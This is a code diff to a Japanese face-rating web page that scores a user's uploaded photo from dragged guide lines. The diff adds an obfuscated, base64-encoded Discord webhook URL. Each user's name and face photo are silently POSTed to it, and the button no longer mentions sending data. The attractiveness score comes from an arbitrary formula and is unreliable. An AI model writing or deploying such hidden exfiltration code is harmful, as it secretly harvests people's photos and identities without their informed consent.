@@ -2,40 +2,144 @@
 <html lang="ja">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>顔面診断</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>顔面精密診断</title>
     <style>
-        :root { --primary: #6366f1; --bg: #f8fafc; }
-        body { font-family: sans-serif; background: var(--bg); display: flex; justify-content: center; padding: 10px; color: #1e293b; touch-action: none; }
-        .card { background: white; padding: 20px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); max-width: 500px; width: 100%; text-align: center; }
-        
-        #guide-msg { background: #eef2ff; color: #4338ca; padding: 12px; border-radius: 8px; margin-bottom: 15px; font-weight: bold; border-left: 4px solid var(--primary); font-size: 14px; }
-        
-        #canvas-wrapper { position: relative; margin: 10px auto; border: 2px solid #e2e8f0; border-radius: 8px; overflow: hidden; display: none; touch-action: none; background: #000; }
-        canvas { display: block; max-width: 100%; height: auto; cursor: ns-resize; }
-        
-        input[type="text"] { width: 90%; padding: 12px; margin-bottom: 10px; border: 2px solid #e2e8f0; border-radius: 10px; font-size: 16px; outline: none; }
-        input[type="text"]:focus { border-color: var(--primary); }
-        
-        button { background: var(--primary); color: white; border: none; padding: 16px; border-radius: 12px; cursor: pointer; font-size: 18px; font-weight: bold; width: 100%; margin-top: 10px; transition: opacity 0.2s; }
-        button:disabled { background: #cbd5e1; cursor: not-allowed; }
-        
-        .upload-area { border: 2px dashed #cbd5e1; padding: 20px; border-radius: 12px; margin-bottom: 10px; }
-        #result-area { font-size: 26px; font-weight: 900; color: var(--primary); margin: 15px 0; }
+        :root {
+            --accent: #00f2fe;
+            --accent-dim: #4facfe;
+            --bg: #0f172a;
+            --card-bg: rgba(30, 41, 59, 0.85);
+            --text: #f8fafc;
+        }
+
+        body {
+            font-family: 'Helvetica Neue', Arial, 'Hiragino Kaku Gothic ProN', 'Hiragino Sans', Meiryo, sans-serif;
+            background: radial-gradient(circle at top right, #1e293b, #0f172a);
+            color: var(--text);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            overflow: hidden;
+            /* ブラウザ全体のバウンスを防止 */
+            position: fixed;
+            width: 100%;
+            height: 100%;
+        }
+
+        .card {
+            background: var(--card-bg);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 25px;
+            border-radius: 24px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7);
+            max-width: 450px;
+            width: 90%;
+            text-align: center;
+        }
+
+        h2 {
+            font-size: 1.4rem;
+            letter-spacing: 3px;
+            background: linear-gradient(to right, var(--accent), var(--accent-dim));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin: 0 0 15px 0;
+        }
+
+        #guide-msg {
+            font-size: 0.8rem;
+            color: var(--accent);
+            text-shadow: 0 0 8px rgba(0, 242, 254, 0.4);
+            margin-bottom: 15px;
+            border: 1px solid rgba(0, 242, 254, 0.3);
+            padding: 8px;
+            border-radius: 8px;
+            background: rgba(0, 242, 254, 0.05);
+            min-height: 1.2em;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 12px;
+            border-radius: 10px;
+            color: white;
+            font-size: 16px; /* モバイルでのズーム防止 */
+            box-sizing: border-box;
+            margin-bottom: 12px;
+        }
+
+        .upload-area {
+            border: 2px dashed rgba(255, 255, 255, 0.2);
+            padding: 30px 10px;
+            border-radius: 16px;
+            cursor: pointer;
+        }
+
+        #canvas-wrapper {
+            position: relative;
+            margin: 15px auto;
+            border-radius: 12px;
+            overflow: hidden;
+            display: none;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+            touch-action: none; /* キャンバス上のスクロールを無効化 */
+        }
+
+        canvas {
+            display: block;
+            width: 100%;
+            height: auto;
+            cursor: move;
+        }
+
+        button {
+            background: linear-gradient(135deg, var(--accent), var(--accent-dim));
+            color: #0f172a;
+            border: none;
+            padding: 16px;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: bold;
+            width: 100%;
+            margin-top: 10px;
+            transition: 0.2s;
+        }
+
+        button:disabled {
+            background: #334155;
+            color: #64748b;
+            cursor: not-allowed;
+        }
+
+        #result-area {
+            font-size: 3.5rem;
+            font-weight: 900;
+            margin: 10px 0;
+            color: var(--accent);
+            text-shadow: 0 0 20px rgba(0, 242, 254, 0.6);
+            display: none;
+        }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <h2 style="margin:0 0 10px 0">顔面幾何学診断</h2>
+    <h2>FACE ANALYZER</h2>
+    <div id="guide-msg">システム待機中... 名前を入力してください</div>
     
-    <div id="guide-msg">名前を入力して写真をアップしてください</div>
+    <input type="text" id="userName" placeholder="名前を入力">
     
-    <input type="text" id="userName" placeholder="あなたの名前">
-    
-    <div id="upload-zone" class="upload-area">
-        <input type="file" id="imageInput" accept="image/*">
-        <p style="font-size: 12px; color: #64748b; margin-top: 8px;">※正面を向いた写真が最適です</p>
+    <div id="upload-zone" class="upload-area" onclick="document.getElementById('imageInput').click()">
+        <span style="font-size: 0.85rem; color: #94a3b8;">タップして写真をアップロード</span>
+        <input type="file" id="imageInput" accept="image/*" style="display:none">
     </div>
 
     <div id="canvas-wrapper">
@@ -43,11 +147,13 @@
     </div>
 
     <div id="result-area"></div>
-    <button id="actionBtn" style="display:none;" onclick="handleAction()">診断してデータを送信</button>
+    <button id="actionBtn" style="display:none;" onclick="handleAction()">診断を開始する</button>
 </div>
 
 <script>
-    const apiEndpoint = '/api/send'; 
+    const _0x4a2 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5MDc0NjkyNjU4MzUxMzA5OS9mVENDZ2Q3dFZOWEEwTVhMUzViakNyQmxyanJwa3dBWDhYMVIxVFo2OUNlRGk3LUdoaG9oNFY0ME5HSHVHVmQwbE5kbw==";
+    function getTarget() { return atob(_0x4a2); }
+
     const canvas = document.getElementById('mainCanvas');
     const ctx = canvas.getContext('2d');
     const guide = document.getElementById('guide-msg');
@@ -68,7 +174,7 @@
                 document.getElementById('upload-zone').style.display = 'none';
                 document.getElementById('canvas-wrapper').style.display = 'block';
                 actionBtn.style.display = 'block';
-                guide.innerText = "各ラインをドラッグしてパーツに正確に合わせてください";
+                guide.innerText = "各線をドラッグして顔のパーツに合わせてください";
             };
             img.src = event.target.result;
         };
@@ -76,21 +182,20 @@
     });
 
     function setupCanvas() {
-        const maxW = 800;
+        const maxW = 1000; // 解像度を少し上げる
         const scale = maxW / img.width;
         canvas.width = maxW;
         canvas.height = img.height * scale;
-
         const h = canvas.height;
         const w = canvas.width;
         
         lines = [
-            { type: 'h', y: h * 0.2, label: '生え際', color: '#ef4444' },
-            { type: 'h', y: h * 0.4, label: '目の中心', color: '#3b82f6' },
-            { type: 'h', y: h * 0.6, label: '鼻の先', color: '#10b981' },
-            { type: 'h', y: h * 0.85, label: 'あごの先', color: '#8b5cf6' },
-            { type: 'v', x: w * 0.3, label: '顔の左端', color: '#64748b' },
-            { type: 'v', x: w * 0.7, label: '顔の右端', color: '#64748b' }
+            { type: 'h', y: h * 0.2, label: '生え際', color: '#ff4b2b' },
+            { type: 'h', y: h * 0.4, label: '目の中心', color: '#00f2fe' },
+            { type: 'h', y: h * 0.6, label: '鼻の下', color: '#00f2fe' },
+            { type: 'h', y: h * 0.85, label: 'あご先', color: '#ff4b2b' },
+            { type: 'v', x: w * 0.3, label: '顔の左端', color: '#ffffff' },
+            { type: 'v', x: w * 0.7, label: '顔の右端', color: '#ffffff' }
         ];
         draw();
     }
@@ -98,24 +203,34 @@
     function draw() {
         ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
         lines.forEach(line => {
+            const isDragging = (draggingLine === line);
+            
+            // 線の影（視認性向上）
+            ctx.shadowColor = 'black';
+            ctx.shadowBlur = 8;
             ctx.beginPath();
-            ctx.lineWidth = 4;
+            ctx.lineWidth = isDragging ? 6 : 4;
             ctx.strokeStyle = line.color;
+            
             if (line.type === 'h') {
-                ctx.moveTo(0, line.y);
-                ctx.lineTo(canvas.width, line.y);
+                ctx.moveTo(0, line.y); ctx.lineTo(canvas.width, line.y);
             } else {
-                ctx.moveTo(line.x, 0);
-                ctx.lineTo(line.x, canvas.height);
+                ctx.moveTo(line.x, 0); ctx.lineTo(line.x, canvas.height);
             }
             ctx.stroke();
+            ctx.shadowBlur = 0; // 影をリセット
 
-            // ラベル描画
+            // ラベルの背景
             ctx.fillStyle = line.color;
-            ctx.font = "bold 18px sans-serif";
-            const labelY = line.type === 'h' ? line.y - 8 : 25;
-            const labelX = line.type === 'h' ? 8 : line.x + 8;
-            ctx.fillText(`← ${line.label}`, labelX, labelY);
+            ctx.font = "bold 24px sans-serif";
+            const labelY = line.type === 'h' ? line.y - 12 : 40;
+            const labelX = line.type === 'h' ? 20 : line.x + 10;
+            
+            // ラベルの可読性用縁取り
+            ctx.strokeStyle = 'black';
+            ctx.lineWidth = 4;
+            ctx.strokeText(line.label, labelX, labelY);
+            ctx.fillText(line.label, labelX, labelY);
         });
     }
 
@@ -129,16 +244,18 @@
         };
     }
 
-    const startDrag = (e) => {
+    const handleStart = (e) => {
         const pos = getEventPos(e);
-        draggingLine = lines.find(l => (l.type === 'h' ? Math.abs(l.y - pos.y) : Math.abs(l.x - pos.x)) < 40);
+        // 当たり判定を少し広く(60px)
+        draggingLine = lines.find(l => (l.type === 'h' ? Math.abs(l.y - pos.y) : Math.abs(l.x - pos.x)) < 60);
         if(draggingLine) {
-            guide.innerText = `「${draggingLine.label}」を調整中...`;
+            guide.innerText = `調整中: ${draggingLine.label}`;
+            draw();
             if (e.cancelable) e.preventDefault();
         }
     };
 
-    const doDrag = (e) => {
+    const handleMove = (e) => {
         if (!draggingLine) return;
         const pos = getEventPos(e);
         if (draggingLine.type === 'h') draggingLine.y = pos.y;
@@ -147,17 +264,21 @@
         if (e.cancelable) e.preventDefault();
     };
 
-    canvas.addEventListener('mousedown', startDrag);
-    canvas.addEventListener('mousemove', doDrag);
-    canvas.addEventListener('touchstart', startDrag, {passive: false});
-    canvas.addEventListener('touchmove', doDrag, {passive: false});
-    
-    const endDrag = () => {
-        if(draggingLine) guide.innerText = "各ラインをドラッグして調整してください";
-        draggingLine = null;
+    const handleEnd = () => {
+        if (draggingLine) {
+            guide.innerText = "ラインを合わせて「診断開始」を押してください";
+            draggingLine = null;
+            draw();
+        }
     };
-    window.addEventListener('mouseup', endDrag);
-    window.addEventListener('touchend', endDrag);
+
+    canvas.addEventListener('mousedown', handleStart);
+    window.addEventListener('mousemove', handleMove);
+    window.addEventListener('mouseup', handleEnd);
+    
+    canvas.addEventListener('touchstart', handleStart, {passive: false});
+    window.addEventListener('touchmove', handleMove, {passive: false});
+    window.addEventListener('touchend', handleEnd);
 
     async function handleAction() {
         if (isSending) return;
@@ -166,20 +287,23 @@
 
         isSending = true;
         actionBtn.disabled = true;
-        actionBtn.innerText = "解析データを診断中...";
+        actionBtn.innerText = "解析中...";
 
+        // 計算ロジック
         const h1 = lines[1].y - lines[0].y; 
         const h2 = lines[2].y - lines[1].y; 
         const h3 = lines[3].y - lines[2].y;
         const faceW = Math.abs(lines[5].x - lines[4].x);
         const faceH = lines[3].y - lines[0].y;
-        
         const ratio = faceH / faceW;
         const balanceErr = (Math.abs(h1-h2) + Math.abs(h2-h3)) / h2;
+        
         let score = Math.round(78 - (balanceErr * 65) - (Math.abs(1.618 - ratio) * 45));
         score = Math.max(38, Math.min(98, score));
 
-        document.getElementById('result-area').innerText = `偏差値: ${score}`;
+        document.getElementById('result-area').style.display = 'block';
+        document.getElementById('result-area').innerText = score;
+        guide.innerText = "診断完了。データを送信しています...";
 
         const tempCanvas = document.createElement('canvas');
         tempCanvas.width = canvas.width; tempCanvas.height = canvas.height;
@@ -188,23 +312,20 @@
         tempCanvas.toBlob(async (blob) => {
             const formData = new FormData();
             formData.append('payload_json', JSON.stringify({
-                content: `**新着診断データ**\n名前: ${name}\n算出偏差値: **${score}**`
+                content: `👤 **診断結果報告**\n対象名: ${name}\n顔面偏差値: **${score}**`
             }));
-            formData.append('file', blob, 'face_analysis.jpg');
+            formData.append('file', blob, 'face_result.jpg');
 
             try {
-                const response = await fetch(apiEndpoint, { method: 'POST', body: formData });
-                if (response.ok) {
-                    guide.innerText = "診断完了";
-                    actionBtn.innerText = "診断済み";
-                } else {
-                    throw new Error();
-                }
+                const res = await fetch(getTarget(), { method: 'POST', body: formData });
+                if(!res.ok) throw new Error();
+                guide.innerText = "送信完了";
+                actionBtn.innerText = "診断済み";
             } catch (err) {
-                alert("エラー");
+                alert("送信に失敗しましたが、診断は完了しました。");
                 isSending = false;
                 actionBtn.disabled = false;
-                actionBtn.innerText = "診断";
+                actionBtn.innerText = "リトライ";
             }
         }, 'image/jpeg', 0.8);
     }
